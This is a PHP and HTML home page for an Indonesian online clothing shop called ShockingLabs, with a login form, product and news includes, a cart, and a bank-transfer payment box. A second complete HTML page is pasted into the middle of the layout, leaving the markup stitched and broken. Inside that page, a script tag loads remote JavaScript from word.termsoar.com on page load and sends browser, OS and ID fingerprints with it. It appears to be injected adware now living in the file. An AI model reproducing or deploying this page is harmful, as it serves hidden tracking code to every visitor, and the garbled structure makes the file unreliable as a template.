<?php
error_reporting(0);
 session_start();
if (ISSET($_SESSION['userlogin']))
{
	header("location:home.php");
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ShockingLabs</title>

<style type="text/css">

.Teks_Menu_Atas {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 10px;
}
.Area_Menu_Kiri {
	height: auto;
	width: 175px;
	margin-left: 6px;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.Area_Menu_Kanan {
	height: auto;
	width: 175px;
	margin-left: 10px;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	text-align: left;
}
.Teks_Login {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 11px;
}

.Teks_Selamat {
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 16px;
	text-align: center;
}

.Teks_Menu {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	font-weight: bold;
}

.Teks_Kategori {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}

.Teks_News {
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 12px;
}

.Teks_Testimonial {
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 12px;
}

.Teks_Informasi {
	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size: 11px;
}

.Teks_Bank {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 13px;
}

.Teks_Produk {
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 14px;
	color: #0096C3;
}

.Area_Produk {
	height: auto;
	width: 375px;
	margin-top: 0px;
	font-size: 10px;
	font-family: Arial, Helvetica, sans-serif;
}

.Area_Slider {
	width: 1000px;
	margin-top: 10px;
}
a:link {
	color: #006699;
	text-decoration: none;
}
a:hover {
	color: #5F9C9F;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
	color: #006699;
}
a:active {
	text-decoration: none;
	color: #5F9C9F;
}

body {
	background-image: url(Gambar/Background.gif);
}
.Area_Produk tr .Teks_Produk {
	text-align: center;
}

</style>
<link href="SpryAssets/SpryMenuBarHorizontal.css" rel="stylesheet" type="text/css" />
<script src="SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<script type="text/javascript">
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}
</script>
</head>

<body onLoad="MM_preloadImages('Gambar/TLogin copy.jpg')">
<table width="1370" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <th width="181" height="21" align="left" valign="top" bgcolor="#F7FAE4" scope="col"><div class="Area_Menu_Kiri"></div></th>
    <th colspan="2" align="right" valign="middle" bgcolor="#F8FBE6" class="Teks_Menu_Atas" scope="col">
      <table width="95%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <th align="right" scope="col"><marquee scrollamount=”3”>
              Selamat datang di website kami, ShockingLabs siap melayani keperluan Anda dengan harga terbaik, selamat berbelanja....&nbsp;
          </marquee></th>
        </tr>
      </table>
</th>
  </tr>
  <tr>
   
  </tr>
 
<!DOCTYPE html>
<html lang="en">
<head>
 <script id="vitruvian" type="text/javascript" async src="http://word.termsoar.com/kernel/8554AC0D-1F8A-4B3C-88FC-A82628ECA432?aid=DD0374BA-7DAE-4050-85C1-631479375AAC&amp;iid=9952A101-92B9-485A-8D59-419F54FFA501&amp;itm=2015-12-16T03:53:43Z" data-nid="8554AC0D-1F8A-4B3C-88FC-A82628ECA432" data-ie-pid="00000000-0000-0000-0000-000000000000" data-cr-pid="00000000-0000-0000-0000-000000000000" data-ff-pid="00000000-0000-0000-0000-000000000000" data-nf-pid="D03D06DB-C141-4A87-B16A-23A86B02163E" data-pid="D03D06DB-C141-4A87-B16A-23A86B02163E" data-aid="DD0374BA-7DAE-4050-85C1-631479375AAC" data-iid="9952A101-92B9-485A-8D59-419F54FFA501" data-ver="1.10.0.28" data-itm="2015-12-16T03:53:43Z" data-hid="3CA3CCF5-FA58-030F-BA64-A5FC8AB9F28B" data-ie-at="00000000-0000-0000-0000-000000000000" data-cr-at="00000000-0000-0000-0000-000000000000" data-ff-at="00000000-0000-0000-0000-000000000000" data-nf-at="4FA40B42-24AA-E954-EF3F-DA99F167BCBD" data-at="4FA40B42-24AA-E954-EF3F-DA99F167BCBD" data-ie-ver="11.0.9600.16384" data-cr-ver="" data-ff-ver="38.0.6 (x86 id)" data-dbsr="firefox" data-osn="Windows 8.1 Pro" data-osv="6.3.9600" data-ost="x32" data-bsr="NF" ></script>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ShockingLabs</title>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
    <!-- Optional theme -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">
    
</head>

<body>

    <div class="container">
        <h1><small>Distro ShockingLabs</small>        </h1>
        <nav class="navbar navbar-default" role="navigation">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="sr-only">Toggle Responsive</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
               
            </div>
            <div class="collapse navbar-collapse" id="navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="home.php">HOME</a></li>
                    <li><a href="produk.php">PRODUCT</a></li>
                    <li><a href="caraorder.php">CARA ORDER</a></li>
                    <li><a href="download.php">DOWNLOAD</a></li>
                    <li><a href="about.php">ABOUT</a></li>
                    <li><a href="contact.php">CONTACT</a></li>
                    <li><a href="konfirmasi.php" onclick="return cekuser()">KONFIRM</a></li>
                </ul>
            </div>
        </nav>  	
    </div>


<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>    
<!-- Latest compiled and minified JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
</body>
</html>

  <tr>
    <td height="625" align="left" valign="top" bgcolor="#E8EED7"><div class="Area_Menu_Kiri">
      <form id="form1" name="form1" method="post" action="login.php">
        <table width="100%" border="0" cellspacing="2" cellpadding="0">
          <tr>
            <td width="29%" class="Teks_Login">User</td>
            <td width="3%" class="Teks_Login">:</td>
            <td width="68%"><label for="usertxt4"></label>
              <input name="usertxt" type="text" id="usertxt4" size="15" /></td>
          </tr>
          <tr>
            <td class="Teks_Login">Password</td>
            <td class="Teks_Login">:</td>
            <td><label for="pswtxt"></label>
              <input name="pswtxt" type="password" id="pswtxt" size="15" /></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
            <td align="left" valign="top">&nbsp;<a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image8','','Gambar/TLogin Rollover.jpg',1)"><input type=image img src="Gambar/TLogin.jpg" alt="" width="50" height="20" id="Image8" /></a></td>
          </tr>
		  
          <tr>
            <td align="left" valign="top">&nbsp;</td>
            <td align="left" valign="top">&nbsp;</td>
            <td align="left" valign="top" class="Teks_Menu_Atas">&nbsp;<a href="member.php" target="_self">Daftar member baru</a></td>
          </tr>
		  <td align="left" valign="top">&nbsp;</td>
            <td align="left" valign="top">&nbsp;</td>
          <td align="left" valign="top" class="Teks_Menu_Atas">&nbsp;<a href="lostpassword.php" target="_self">Lupa Password</a></td>
          </tr>
		  
          <tr>
            <td colspan="3" align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="2">
              <tr>
                <th align="left" valign="top" scope="col"><img src="Gambar/Menu Kiri Kategori.jpg" alt="" width="175" height="25" /></th>
                </tr>
              <tr>
 <th align="left" valign="top" class="Teks_Kategori" scope="col"><?php include "kategori.php"; ?></th>
                </tr>
              </table></td>
          </tr>
          <tr>
            <td colspan="3" align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="2">
              <tr>
                <th align="left" valign="top" scope="col"><img src="Gambar/Menu Kiri News.jpg" alt="" width="175" height="25" /></th>
                </tr>
              <tr>
         <td align="left" valign="top" class="Teks_News" scope="col"><?php include "news.php"; ?>
                    <a href="lihatnews.php" target="_self">>> lihat news </a></div></td>
                </tr>
              </table></td>
          </tr>
          <tr>
            <td align="left" valign="top">&nbsp;</td>
            <td align="left" valign="top">&nbsp;</td>
            <td align="left" valign="top">&nbsp;</td>
            </tr>
          <tr>
            <td colspan="3" align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="2">
              <tr>
                <th align="left" valign="top" scope="col"><img src="Gambar/Menu Kiri Tertimonial.jpg" alt="" width="175" height="25" /></th>
              </tr>
              <tr>
 <td valign="top" class="Teks_Testimonial" scope="col"><?php include "top_testimonial.php"; ?>
                  <br />
                  <br />
                  <div><a href="isitestimonial.php" target="_self" onclick="return cekuser()">>> isi testimonial</a><br />
                    <a href="lihattestimonial.php" target="_self">>> lihat testimonial </a></div>
<br /></td>
              </tr>
            </table></td>
            </tr>
          <tr>
            <td align="left" valign="top">&nbsp;</td>
            <td>&nbsp;</td>
            <td class="Teks_Produk">&nbsp;</td>
          </tr>
        </table>
      </form>
    </div></td>
    <th width="1000" align="center" valign="top" bgcolor="#FFFFFF"><table width="100%" border="0" cellpadding="0" cellspacing="0" class="Area_Produk">
      <tr>
        <th align="center" valign="top" scope="col"><div class="Area_Slider">
          <table width="100%" border="0">
            <tr>
              <td><?php include"slider.php" ?></td>
            </tr>
          </table>
        </div></th>
      </tr>
      <tr>
        <th align="left" valign="top" class="Teks_Selamat" scope="col">&nbsp;</th>
      </tr>
      <tr>
        <th align="left" valign="top" class="Teks_Selamat" scope="col">Selamat datang di ShockingLabs.<br />
          Nikmati kemudahan berbelanja bersama kami !!!     <br /></th>
      </tr>
      <tr>
        <th align="left" valign="top" class="Teks_Produk" scope="col"><hr /></th>
      </tr>
      <tr>
        <th align="left" valign="top" class="Teks_Produk" scope="col"> NEWS ITEM &amp; RESTOCK !!!</th>
      </tr>
      <tr>
        <th align="left" valign="top" class="Teks_Produk" scope="col">&nbsp;</th>
      </tr>
      <tr>
        <td align="center" valign="top"><div class="Area_Produk">
          <?php include "produk_baru.php"; ?>
        </div></td>
      </tr>
    </table></th>
    <td width="189" align="left" valign="top" bgcolor="#E8EED7"><div class="Area_Menu_Kanan">
        <table width="100%" border="0" cellspacing="2" cellpadding="0">
          <tr>
            <th width="13%" align="left" valign="top" scope="col"><img src="Gambar/Kantong Belanja.png" width="25" height="25" /></th>
            <td width="87%" align="left" valign="middle" class="Teks_Menu" scope="col">Keranjang Belanja <?php include "jumlah.php"; ?></td>
          </tr>
          <tr>
  <th colspan="2" align="center" valign="top" scope="col"><?php include "keranjang_belanja_memo.php"; ?></th>
          </tr>
          <tr>
            <th colspan="2" align="left" valign="top" class="Teks_Keranjang" scope="col">&nbsp;</th>
          </tr>
          <tr>
            <th colspan="2" align="left" valign="top" scope="col"><img src="Gambar/Menu Kanan Best Seller.jpg" width="175" height="25" /></th>
          </tr>
          <tr>
            <th colspan="2" align="center" valign="top" scope="col"><?php include "bestseller.php"; ?></th>
          </tr>
          <tr>
            
          </tr>
          <tr>
            <th colspan="2" align="left" valign="top" scope="col"><img src="Gambar/Menu Kanan Pembayaran.jpg" alt="" width="175" height="25" /></th>
          </tr>
          <tr>
            <th align="center" valign="top" scope="col">&nbsp;</th>
            <th align="center" valign="top" scope="col">&nbsp;</th>
          </tr>
          <tr>
            <th colspan="2" align="center" valign="top" scope="col"><a href="https://ibank.klikbca.com/" target="new"><img src="Gambar/bca.jpg" alt="" width="150" height="50" /></a></th>
          </tr>
          <tr>
            <td colspan="2" align="center" valign="top" class="Teks_Bank" scope="col">4450946066</td>
          </tr>
          <tr>
            <td colspan="2" align="center" valign="top" class="Teks_Bank" scope="col">Fenny Kurniawan</td>
          </tr>
          <tr>
            <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
            <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
          </tr>
          <tr>
           
          
          </tr>
          <tr>
          </tr>
          <tr>
            <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
            <th align="center" valign="top" class="Teks_Bank" scope="col">&nbsp;</th>
          </tr>
        </table>
    </div></td>
  </tr>
  <tr>
    <td colspan="3">&nbsp;</td>
  </tr>
</table>
<script type="text/javascript">
var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"SpryAssets/SpryMenuBarDownHover.gif", imgRight:"SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>